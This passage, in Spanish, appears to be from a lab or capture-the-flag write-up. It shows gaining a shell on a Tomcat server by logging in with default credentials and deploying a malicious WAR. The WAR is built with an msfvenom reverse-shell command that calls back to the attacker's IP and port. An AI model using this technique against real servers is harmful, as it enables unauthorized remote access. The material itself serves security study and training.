## Shell as system

Yendo a la pagina del administrador use las credenciales por defecto de tomcat `(tomcat:s3cret)`, dandome asi al panel.

![image-center](/assets/images/Pasted image 20260210170532.png)
### War malicious file

Como puedo subir un war, cree uno con `msfvenom` el cual se encarga de enviarme una shell a mi maquina. También es opcional, pero se puede usar [este script](https://github.com/thewhiteh4t/warsend) que automatiza el proceso

```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.19 LPORT=4444 -f war -o rev.war
Payload size: 1095 bytes
Final size of war file: 1095 bytes
Saved as: rev.war
```
### Deploy

Lo cargue en la web y lo desplegué.
